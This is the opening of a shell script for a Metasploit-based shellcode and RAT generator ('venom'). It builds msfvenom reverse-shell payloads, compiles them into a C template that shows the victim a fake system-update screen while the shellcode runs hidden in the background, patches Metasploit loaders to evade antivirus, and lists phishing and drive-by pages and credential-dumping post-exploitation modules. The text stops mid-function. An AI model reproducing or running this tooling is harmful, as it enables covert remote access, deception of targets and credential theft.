#!/bin/sh
# --------------------------------------------------------------
# venom - metasploit Shellcode generator/compiler/listenner
# Suspicious-Shell-Activity (SSA) RedTeam @2017 - @2020
# codename: Shinigami (GPL licensed)
# Stable version: 1.0.17
# Dev version: 1.0.17.6
# --------------------------------------------------------------
# [INSTALL DEPENDENCIES]
# cd aux && sudo ./setup.sh
# --------------------------------------------------------------
# Resize terminal windows size befor running the tool (gnome terminal)
# Special thanks to h4x0r Milton@Barra for this little piece of heaven! :D




# --------------------
# check if user is root
# ---------------------
if [ $(id -u) != "0" ]; then
  echo "[x] we need to be root to run this script..."
  echo "[x] execute [ sudo ./venom.sh ] on terminal"
  exit
fi



# ------------------------------
# Make sure ZENITY its installed
# ------------------------------
zen=$(which zenity)
if ! [ "$?" -eq "0" ]; then
   echo "[x] zenity............................[ NOT found ]";sleep 12
   echo "[i] Please Wait, installing dependencie...";sleep 2
   sudo apt-get install zenity
   sleep 2;clear
fi



# -----------------------------------
# Colorise shell Script output leters
# -----------------------------------
Colors() {
Escape="\033";
  white="${Escape}[0m";
  RedF="${Escape}[31m";
  GreenF="${Escape}[32m";
  YellowF="${Escape}[33m";
  BlueF="${Escape}[34m";
  CyanF="${Escape}[36m";
  RedBg="${Escape}[1;3;7;31m";
  GreenBg="${Escape}[1;3;7;32m";
Reset="${Escape}[0m";
}



Colors;
# ----------------------
# variable declarations
# ----------------------
OS=`uname` # grab OS
H0m3=`echo ~` # grab home path
ver="1.0.17" # script version display
C0d3="Shinigami" # version codename display
user=`who | awk {'print $1'}` # grab username
# user=`who | cut -d' ' -f1 | sort | uniq` # grab username
DiStR0=`awk '{print $1}' /etc/issue` # grab distribution -  Ubuntu or Kali
IPATH=`pwd` # grab venom.sh install path (home/username/shell)
# ------------------------------------------------------------------------
# funtions [templates] to be injected with shellcode
# ------------------------------------------------------------------------
Ch4Rs="$IPATH/output/chars.raw" # shellcode raw output path
InJEc="$IPATH/templates/exec.c" # exec script path
InJEc2="$IPATH/templates/exec.py" # exec script path
InJEc3="$IPATH/templates/exec_bin.c" # exec script path
InJEc4="$IPATH/templates/exec.rb" # exec script path
InJEc5="$IPATH/templates/exec_dll.c" # exec script path
InJEc6="$IPATH/templates/hta_attack/exec.hta" # exec script path
InJEc7="$IPATH/templates/hta_attack/index.html" # hta index path
InJEc8="$IPATH/templates/InvokePS1.bat" # invoke-shellcode script path
InJEc9="$IPATH/templates/exec0.py" # exec script path
InJEc10="$IPATH/templates/InvokeMeter.bat" # exec script path
InJEc11="$IPATH/templates/exec.php" # php script path
# phishing webpages to trigger RCE or downloads
InJEc12="$IPATH/templates/phishing/mega.html" # fake webpage script path
InJEc13="$IPATH/templates/phishing/driveBy.html" # fake webpage script path
InJEc14="$IPATH/templates/hta_attack/index.html" # fake webpage script path
InJEc15="$IPATH/templates/exec_psh.c" # c script path
InJEc16="$IPATH/templates/exec.jar" # jar script path


# -------------------------------------------
# SETTINGS FILE FUNTION (venom-main/settings)
# -------------------------------------------
ChEk=`cat settings | egrep -m 1 "MSF_REBUILD" | cut -d '=' -f2` > /dev/null 2>&1
MsFu=`cat settings | egrep -m 1 "MSF_UPDATE" | cut -d '=' -f2` > /dev/null 2>&1
ApAcHe=`cat settings | egrep -m 1 "APACHE_WEBROOT" | cut -d '=' -f2` > /dev/null 2>&1
D0M4IN=`cat settings | egrep -m 1 "MEGAUPLOAD_DOMAIN" | cut -d '=' -f2` > /dev/null 2>&1
DrIvC=`cat settings | egrep -m 1 "WINE_DRIVEC" | cut -d '=' -f2` > /dev/null 2>&1
MsFlF=`cat settings | egrep -m 1 "MSF_LOGFILES" | cut -d '=' -f2` > /dev/null 2>&1
PyIn=`cat settings | egrep -m 1 "PYTHON_VERSION" | cut -d '=' -f2` > /dev/null 2>&1
PiWiN=`cat settings | egrep -m 1 "PYINSTALLER_VERSION" | cut -d '=' -f2` > /dev/null 2>&1
pHanTom=`cat settings | egrep -m 1 "POST_EXPLOIT_DIR" | cut -d '=' -f2` > /dev/null 2>&1
ArCh=`cat settings | egrep -m 1 "SYSTEM_ARCH" | cut -d '=' -f2` > /dev/null 2>&1
UUID_RANDOM_LENGTH="70" # build 23 uses random keys (comments) to evade signature detection (default 70)
EnV=`hostnamectl | grep Chassis | awk {'print $2'}` > /dev/null 2>&1


# --------------------------------------------
# Config user system correct arch (wine+mingw)
# --------------------------------------------
if [ "$ArCh" = "x86" ]; then
   arch="wine"                 # Wine cmd line syntax
   PgFi="Program Files"        # Wine Program Files directory
   ComP="i586-mingw32msvc-gcc" # Mingw32 GCC library
elif [ "$ArCh" = "x64" ]; then
   arch="wine64"               # Wine cmd line syntax
   PgFi="Program Files"        # Wine Program Files directory
   ComP="i686-w64-mingw32-gcc" # Mingw-W64 GCC library
else
   echo "${RedF}[x]${white} ERROR: Wrong value input: [ $ArCh ]: not accepted ..${Reset}"
   echo "${RedF}[x]${white} Edit [ settings ] File and Set the var: SYSTEM_ARCH= ${Reset}"
   exit
fi


# -----------------------------------------
# msf postgresql database connection check?
# -----------------------------------------
if [ "$ChEk" = "ON" ]; then
echo ${BlueF}
cat << !
    ╔─────────────────────────────────────────────────╗
    |  postgresql metasploit database connection fix  |
    ╚─────────────────────────────────────────────────╝
!

  #
  # start msfconsole to check postgresql connection status
  #
  service postgresql start
  echo ${BlueF}[☠]${white} Checking msfdb connection status ..${Reset}
  ih=`msfconsole -q -x 'db_status; exit -y' | awk {'print $3'}`
  if [ "$ih" != "connected" ]; then
    echo ${RedF}[x]${white} postgresql selected, no connection ..${Reset}
    echo ${BlueF}[☠]${white} Please wait, rebuilding msf database ..${Reset}
    # rebuild msf database (database.yml)
    echo ""
    msfdb reinit | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Rebuild metasploit database" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    echo ""
    echo ${BlueF}[✔]${white} postgresql connected to msf ..${Reset}
    sleep 2
  else
    echo ${BlueF}[✔]${white} postgresql connected to msf ..${Reset}
    sleep 2
  fi
fi


# -----------------------------------------------
# update metasploit database before running tool?
# -----------------------------------------------
if [ "$MsFu" = "ON" ]; then
echo ${BlueF}
cat << !
    ╔─────────────────────────────────────────────────╗
    | please wait fetching latest metasploit modules  |
    ╚─────────────────────────────────────────────────╝
!
  xterm -T " UPDATING MSF DATABASE " -geometry 110x23 -e "msfconsole -x 'msfupdate; exit -y' && sleep 2"
fi


# -----------------------------------------------
# venom framework configurated to store logfiles?
# -----------------------------------------------
if [ "$MsFlF" = "ON" ]; then
echo ${BlueF}
cat << !
    ╔─────────────────────────────────────────────────╗
    | venom framework configurated to store logfiles  |
    ╚─────────────────────────────────────────────────╝
!
sleep 2
fi


# ---------------------------------------------
# grab Operative System distro to store IP addr
# output = Ubuntu OR Kali OR Parrot OR BackBox
# ---------------------------------------------
InT3R=`netstat -r | grep "default" | awk {'print $8'}` # grab interface in use
case $DiStR0 in
    Kali) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Debian) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Mint) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}' | cut -d ':' -f2`;;
    Ubuntu) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    Parrot) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    BackBox) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    elementary) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    *) IP=`zenity --title="☠ Input your IP addr ☠" --text "example: 192.168.1.68" --entry --width 300`;;
  esac
clear


# ------------------------------------
# end of script internal settings and
# display credits befor running module
# ------------------------------------
#                  - CodeName: $C0d3 -
echo ${BlueF} && clear && cat << !
                              
               __    _ ______  ____   _  _____  ____    __  
              \  \  //|   ___||    \ | |/     \|    \  /  |
               \  \// |   ___||     \| ||     ||     \/   |
                \__/  |______||__/\____|\_____/|__/\__/|__|
!
echo "${RedF}     Shellcode/Rat_Generator${white}::${RedF}CodeName${white}::${RedF}$C0d3${white}::${RedF}SSA(redteam @2020)${BlueF}"
echo "    ╔════════════════════════════════════════════════════════════════╗"
echo "    ║  ${YellowF}The main goal of this tool its not to build 'FUD' payloads!${BlueF}   ║"
echo "    ║  ${YellowF}But to give to its users the first glance of how shellcode is${BlueF} ║"
echo "    ║  ${YellowF}build, embedded into one template (any language), obfuscated${BlueF}  ║"
echo "    ║  ${YellowF}(e.g pyherion.py) and compiled into one executable file.${BlueF}      ║"
echo "    ╠════════════════════════════════════════════════════════════════╝"
echo "    ║ Author: r00t-3xp10it | Suspicious Shell Activity (Red Team)"
echo "    ╚ VERSION:${YellowF}$ver ${BlueF}USER:${YellowF}$user ${BlueF}INTERFACE:${YellowF}$InT3R ${BlueF}ARCH:${YellowF}$ArCh ${BlueF}DISTRO:${YellowF}$DiStR0"${Reset}
echo "" && echo ""
sleep 1
echo ${BlueF}[☠]${white} Press [${GreenF} ENTER ${white}] to continue ..${Reset}
read op


# -----------------------------------------
# check dependencies (msfconsole + apache2)
# -----------------------------------------
imp=`which msfconsole`
if [ "$?" -eq "0" ]; then
echo "msfconsole found" > /dev/null 2>&1
else
echo ""
echo ${RedF}[x]${white} msfconsole -> not found!${Reset}
echo ${BlueF}[☠]${white} This script requires msfconsole to work!${Reset}
sleep 2
exit
fi

apc=`which apache2`
if [ "$?" -eq "0" ]; then
echo "apache2 found" > /dev/null 2>&1
else
echo ""
echo ${RedF}[x]${white} apache2 -> not found!${Reset}
echo ${BlueF}[☠]${white} This script requires apache2 to work!${Reset}
sleep 2
echo ""
echo ${BlueF}[☠]${white} Please run: cd aux && sudo ./setup.sh${Reset}
echo ${BlueF}[☠]${white} to install all missing dependencies...${Reset}
exit
fi


# --------------------------------------------
# start metasploit/postgresql/apache2 services
# --------------------------------------------
if [ "$DiStR0" = "Kali" ]; then
service postgresql start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
else
/etc/init.d/metasploit start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting metasploit service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
fi
clear


# -----------------------------------------------
# arno0x0x meterpreter loader random bytes stager
# -----------------------------------------------
Chts=`cat settings | egrep -m 1 "RANDOM_STAGER_BYTES" | cut -d '=' -f2` > /dev/null 2>&1
ArNo=`cat settings | egrep -m 1 "METERPRETER_STAGER" | cut -d '=' -f2` > /dev/null 2>&1
if [ "$Chts" = "ON" ]; then
  if [ -e "$IPATH/obfuscate/meterpreter_loader.rb" ]; then
    echo ${BlueF}[${GreenF}✔${BlueF}]${white} arno0x0x meterpreter loader random bytes stager: active ..${Reset}
    sleep 2
  else
echo ${BlueF}
cat << !
    ╔═════════════════════════════════════════════════════════════════════╗
    ║  arno0x0x meterpreter_loader random bytes stager av bypass technic  ║
    ║                              ---                                    ║
    ║ This setting forces venom toolkit at startup to backup/replace the  ║
    ║ msf meterpreter_loader.rb (x86) and is counter part (x64) adding an ║
    ║ arbitrary number of random bytes at the beginning of the stage being║
    ║sent back to the stager in an attempt to evade AV signature detection║
    ╚═════════════════════════════════════════════════════════════════════╝

!
sleep 2
    # backup msf modules
    echo ${BlueF}[☠]${white} Backup default msf modules ..${Reset}
    sleep 1
    echo "$ArNo/meterpreter_loader.rb"
    cp $ArNo/meterpreter_loader.rb $IPATH/obfuscate/meterpreter_loader.rb
    echo "$ArNo/x64/meterpreter_loader.rb"
    cp $ArNo/x64/meterpreter_loader.rb $IPATH/obfuscate/meterpreter_loader_64.rb
    # replace default modules
    echo ${BlueF}[☠]${white} Replace default modules by venom modules ..${Reset}
    sleep 1
    cp $IPATH/aux/msf/meterpreter_loader.rb $ArNo/meterpreter_loader.rb > /dev/null 2>&1
    cp $IPATH/aux/msf/meterpreter_loader_64.rb $ArNo/x64/meterpreter_loader.rb > /dev/null 2>&1
    # start postgresql + reload msfdb
    echo ${BlueF}[☠]${white} Rebuild/Reload msf database ..${Reset}
    sleep 1
    msfdb reinit | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Rebuild metasploit database" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    msfconsole -q -x 'reload_all; exit -y' | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Reload metasploit database" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    echo ${BlueF}[${GreenF}✔${BlueF}]${white} arno0x0x meterpreter loader random bytes stager: active ..${Reset}
    sleep 2
  fi
fi
clear


# ----------------------------------
# bash trap ctrl-c and call ctrl_c()
# ----------------------------------
trap ctrl_c INT
ctrl_c() {
echo "${RedF}[x]${white} CTRL+C PRESSED -> ABORTING TASKS!"${Reset}
sleep 1
echo ${BlueF}[☠]${white} Cleanning temp generated files...${Reset}
# just in case :D !!!
# revert [templates] backup files to default stages
mv $IPATH/templates/exec[bak].c $InJEc > /dev/null 2>&1
mv $IPATH/templates/exec[bak].py $InJEc2 > /dev/null 2>&1
mv $IPATH/templates/exec_bin[bak].c $InJEc3 > /dev/null 2>&1
mv $IPATH/templates/exec[bak].rb $InJEc4 > /dev/null 2>&1
mv $IPATH/templates/exec_dll[bak].c $InJEc5 > /dev/null 2>&1
mv $IPATH/templates/hta_attack/exec[bak].hta $InJEc6 > /dev/null 2>&1
mv $IPATH/templates/hta_attack/index[bak].html $InJEc7 > /dev/null 2>&1
mv $IPATH/templates/InvokePS1[bak].bat $InJEc8 > /dev/null 2>&1
mv $IPATH/templates/exec0[bak].py $InJEc9 > /dev/null 2>&1
mv $IPATH/templates/exec[bak].php $InJEc11 > /dev/null 2>&1
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/phishing/driveBy[bak].html $InJEc13 > /dev/null 2>&1
mv $IPATH/templates/web_delivery[bak].bat $IPATH/templates/web_delivery.bat > /dev/null 2>&1
mv $IPATH/templates/evil_pdf/PDF-encoder[bak].py PDF-encoder.py > /dev/null 2>&1
mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
mv $IPATH/aux/persistence2[bak].rc $IPATH/aux/persistence2.rc > /dev/null 2>&1
mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
mv $IPATH/aux/msf/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/msf/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
# delete temp generated files
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/templates/trigger.raw > /dev/null 2>&1
rm $IPATH/templates/obfuscated.raw > /dev/null 2>&1
rm $IPATH/templates/copy.c > /dev/null 2>&1
rm $IPATH/templates/copy2.c > /dev/null 2>&1
rm $IPATH/templates/final.c > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $IPATH/output/sedding.raw > /dev/null 2>&1
rm $IPATH/output/payload.raw > /dev/null 2>&1
rm $IPATH/templates/evil_pdf/template.raw > /dev/null 2>&1
rm $IPATH/templates/evil_pdf/template.c > /dev/null 2>&1
rm $IPATH/bin/*.ps1 > /dev/null 2>&1
rm $IPATH/bin/*.vbs > /dev/null 2>&1
rm -r $H0m3/.psploit > /dev/null 2>&1
rm $IPATH/bin/sedding.raw > /dev/null 2>&1
rm $IPATH/obfuscate/final.vbs > /dev/null 2>&1
# delete temp files from apache webroot
rm $ApAcHe/installer.bat > /dev/null 2>&1
rm $ApAcHe/trigger.sh > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/*.apk > /dev/null 2>&1
rm $ApAcHe/*.exe > /dev/null 2>&1
rm $ApAcHe/*.py > /dev/null 2>&1
rm $ApAcHe/*.bat > /dev/null 2>&1
rm $ApAcHe/*.deb > /dev/null 2>&1
# delete pyinstaller temp files
rm $IPATH/*.spec > /dev/null 2>&1
rm -r $IPATH/dist > /dev/null 2>&1
rm -r $IPATH/build > /dev/null 2>&1
# delete rtf files
rm /tmp/shell.exe > /dev/null 2>&1
rm $ApAcHe/shell.exe > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/$N4m.rtf > /dev/null 2>&1
# icmp (ping) shell
if [ "$ICMPDIS" = "disabled" ]; then
   echo "${RedF}[x]${white} Local ICMP Replies are disable (enable ICMP replies)${white}"
   sysctl -w net.ipv4.icmp_echo_ignore_all=0 >/dev/null 2>&1
fi
rm $ApAcHe/$N4m.zip > /dev/null 2>&1
rm $ApAcHe/$N4m.bat > /dev/null 2>&1
rm $ApAcHe/icmpsh.exe > /dev/null 2>&1
# exit venom.sh
echo ${BlueF}[☠]${white} Exit Shellcode Generator...${Reset}
echo ${BlueF}[☠]${white} [_Codename:$C0d3]${Reset}
sleep 1
if [ "$DiStR0" = "Kali" ]; then
service postgresql stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
else
/etc/init.d/metasploit stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop metasploit service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
fi
cd $IPATH
cd ..
sudo chown -hR $user shell > /dev/null 2>&1


# -----------------------
# arno0x0x av obfuscation
# ----------------------
if [ "$Chts" = "ON" ]; then
  if [ -e "$IPATH/obfuscate/meterpreter_loader.rb" ]; then
    # backup msf modules
    echo ${BlueF}[${GreenF}✔${BlueF}]${white} arno0x0x meterpreter loader random bytes stager: revert ..${Reset}
    echo ${BlueF}[☠]${white} Revert default msf modules ..${Reset}
    sleep 1
    cp $IPATH/obfuscate/meterpreter_loader.rb $ArNo/meterpreter_loader.rb
    cp $IPATH/obfuscate/meterpreter_loader_64.rb $ArNo/x64/meterpreter_loader.rb
    rm $IPATH/obfuscate/meterpreter_loader.rb
    rm $IPATH/obfuscate/meterpreter_loader_64.rb
    # reload msfdb
    echo ${BlueF}[☠]${white} Rebuild/Reload msf database ..${Reset}
    sleep 1
    msfdb reinit | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Rebuild metasploit database" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    msfconsole -q -x 'reload_all; exit -y' | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Reload metasploit database" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
  else
    echo ${RedF}[x]${white} no backup msf modules found..${Reset}
    sleep 2
  fi
fi
exit
}



# -------------------------------------------------END OF SCRIPT SETTINGS------------------------------------->




# ---------------------------------------------
# build shellcode in C format
# targets: Apple | BSD | LINUX | SOLARIS
# ---------------------------------------------
sh_shellcode1 () {
# get user input to build shellcode
echo ${BlueF}[☠]${white} Enter shellcode settings!${Reset}
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "linux/ppc/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "linux/x64/shell/reverse_tcp" FALSE "linux/x64/shell_reverse_tcp" FALSE "linux/x64/meterpreter/reverse_tcp" FALSE "osx/armle/shell_reverse_tcp" FALSE "osx/ppc/shell_reverse_tcp" FALSE "osx/x64/shell_reverse_tcp" FALSE "bsd/x86/shell/reverse_tcp" FALSE "bsd/x64/shell_reverse_tcp" FALSE "solaris/x86/shell_reverse_tcp" --width 350 --height 460) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
echo ${BlueF}[☠]${white} editing/backup files...${Reset};

## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="shellcode";fi


echo "${BlueF}[☠]${white} Building shellcode -> C format ..."${Reset};
sleep 2
# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    NAME    : $N4m
    FORMAT  : C -> UNIX
    PAYLOAD : $paylo

!

# use metasploit to build shellcode
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c -o $IPATH/output/chars.raw"
echo ""
# display generated shelcode
cat $IPATH/output/chars.raw
echo ""
sleep 2
# parsing shellcode data
cmd=$(cat $IPATH/output/chars.raw | grep -v "=")


   # check if all dependencies needed are installed
   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "${BlueF}[☠]${white} chars.raw -> found!"${Reset};
      sleep 2 
   else
      echo "${RedF}[x]${white} chars.raw -> not found!"${Reset};
      exit
   fi

   # check if gcc exists
   audit=`which gcc`> /dev/null 2>&1
   if [ "$?" -eq "0" ]; then
      echo "${BlueF}[☠]${white} gcc compiler -> found!"${Reset};
      sleep 2
   else
      echo "${RedF}[x]${white} gcc compiler -> not found!"${Reset};
      echo "${BlueF}[☠]${white} Download compiler -> apt-get install gcc"${Reset};
      echo ""
      sudo apt-get install gcc
      echo ""
   fi


## EDITING/BACKUP FILES NEEDED
cp $InJEc $IPATH/templates/exec[bak].c


# -----------------
# BUILD C TEMPLATE
# -----------------
echo "#include<stdio.h>" > $IPATH/output/exec.c
echo "#include<stdlib.h>" >> $IPATH/output/exec.c
echo "#include<string.h>" >> $IPATH/output/exec.c
echo "#include<sys/types.h>" >> $IPATH/output/exec.c
echo "#include<sys/wait.h>" >> $IPATH/output/exec.c
echo "#include<unistd.h>" >> $IPATH/output/exec.c
echo "" >> $IPATH/output/exec.c
echo "/*" >> $IPATH/output/exec.c
echo "Author: r00t-3xp10it" >> $IPATH/output/exec.c
echo "Framework: venom v1.0.17" >> $IPATH/output/exec.c
echo "gcc -fno-stack-protector -z execstack exec.c -o $N4m" >> $IPATH/output/exec.c
echo "*/" >> $IPATH/output/exec.c
echo "" >> $IPATH/output/exec.c
echo "/* msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c */" >> $IPATH/output/exec.c
echo "unsigned char kungfu[] =" >> $IPATH/output/exec.c
echo "$cmd" >> $IPATH/output/exec.c
echo "" >> $IPATH/output/exec.c
echo "int main()" >> $IPATH/output/exec.c
echo "{" >> $IPATH/output/exec.c
echo "/*" >> $IPATH/output/exec.c
echo "This fork(); function allow us to spawn a new child process (in background). This way i can" >> $IPATH/output/exec.c
echo "execute shellcode in background while continue the execution of the C program in foreground." >> $IPATH/output/exec.c
echo "Article: https://www.geeksforgeeks.org/zombie-and-orphan-processes-in-c" >> $IPATH/output/exec.c
echo "*/" >> $IPATH/output/exec.c
echo "fflush(NULL);" >> $IPATH/output/exec.c
echo "int pid = fork();" >> $IPATH/output/exec.c
echo "   if (pid > 0) {" >> $IPATH/output/exec.c
echo "      /* We are running in parent process (as foreground job). */" >> $IPATH/output/exec.c
echo "      printf(\"Please Wait, Updating system ..\\\n\\\n\");" >> $IPATH/output/exec.c
echo "      /* Display system information onscreen to target user */" >> $IPATH/output/exec.c
echo "      sleep(1);system(\"h=\$(hostnamectl | grep 'Static' | cut -d ':' -f2);echo \\\"Hostname   :\$h\\\"\");" >> $IPATH/output/exec.c
echo "      system(\"k=\$(hostnamectl | grep 'Kernel' | cut -d ':' -f2);echo \\\"Kernel     :\$k\\\"\");" >> $IPATH/output/exec.c
echo "      system(\"b=\$(hostnamectl | grep 'Boot' | cut -d ':' -f2);echo \\\"Boot ID    :\$b\\\"\");" >> $IPATH/output/exec.c
echo "      sleep(2);printf(\"\\\n\");" >> $IPATH/output/exec.c
echo "      system(\"OP=\$(hostnamectl | grep 'Operating' | awk {'print \$3'});echo \\\"Hit:1 http://\$OP.download/\$OP \$OP-rolling/contrib\\\"\");" >> $IPATH/output/exec.c
echo "      printf(\"------------------------------------------------------\\\n\");" >> $IPATH/output/exec.c
echo "      sleep(1);system(\"for i in 1023.8353.9354:/daemon 7384.8400.8112:/etc/apt 3305.6720.2201:/etc/bin 6539.3167.1200:/etc/cron 4739.0473.4370:/etc/systemd 9164.0257.0034:/etc/passwd 1023.2559.0076:/etc/crontab 3945.4401.5037:/etc/fork.sys 4406.4490.2320:/etc/drive.sys 1288.3309.9955:/etc/PSmanager 1992.9909.1234:/etc/synaptic 4856.4845.6677:/etc/sources.list 4400.0079.0001:/etc/shadow;do dt=\$(date|awk {'print \$4,\$5,\$6'});echo \\\"\$dt - PATCHING: \$i\\\" && sleep 1;done\");" >> $IPATH/output/exec.c
echo "      printf(\"------------------------------------------------------\\\n\");" >> $IPATH/output/exec.c
echo "      printf(\"Please Wait, finishing update process ..\\\n\");" >> $IPATH/output/exec.c
echo "      sleep(2);printf(\"Done...\\\n\");" >> $IPATH/output/exec.c
echo "   }" >> $IPATH/output/exec.c
echo "   else if (pid == 0) {" >> $IPATH/output/exec.c
echo "      /* We are running in child process (as backgrond job - orphan). */" >> $IPATH/output/exec.c
echo "      setsid();" >> $IPATH/output/exec.c
echo "      void (*ret)() = (void(*)())kungfu;" >> $IPATH/output/exec.c
echo "      ret();" >> $IPATH/output/exec.c
echo "  } return 0;" >> $IPATH/output/exec.c
echo "}" >> $IPATH/output/exec.c


cd $IPATH/templates
# COMPILING SHELLCODE USING GCC
echo "${BlueF}[☠]${white} Compiling using gcc..."${Reset};
gcc -fno-stack-protector -z execstack $IPATH/output/exec.c -o $IPATH/output/$N4m


## CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m\n\nExecute: sudo ./$N4m\n\nchose how to deliver: $N4m" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 350 --height 305) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo ${BlueF}[☠]${white} Start a multi-handler...${Reset};
      echo ${YellowF}[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell${Reset};
      echo ${BlueF}[☯]${white} Please dont test samples on virus total...${Reset};
        if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log  
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
        fi
      sleep 2

   else

P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "linux_hostrecon.rc" FALSE "dump_credentials_linux.rc" FALSE "exploit_suggester.rc" --width 305 --height 260) > /dev/null 2>&1


if [ "$P0" = "dump_credentials_linux.rc" ]; then
  if [ -e "$pHanTom/post/linux/gather/wifi_dump_linux.rb" ]; then
    echo ${GreenF}[✔]${white} wifi_dump_linux.rb -> found${Reset};
    sleep 2
  else
    echo ${RedF}[x]${white} wifi_dump_linux.rb -> not found${Reset};
    sleep 1
    echo ${BlueF}[*]${white} copy post-module to msfdb ..${Reset};
    cp $IPATH/aux/msf/wifi_dump_linux.rb $pHanTom/post/linux/gather/wifi_dump_linux.rb > /dev/null 2>&1
    echo ${BlueF}[☠]${white} Reloading msfdb database ..${Reset};
    sleep 2
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
  fi

elif [ "$P0" = "linux_hostrecon.rc" ]; then
  if [ -e "$pHanTom/post/linux/gather/linux_hostrecon.rb" ]; then
    echo ${GreenF}[✔]${white} linux_hostrecon.rb -> found${Reset};
    sleep 2
  else
    echo ${RedF}[x]${white} linux_hostrecon.rb -> not found${Reset};
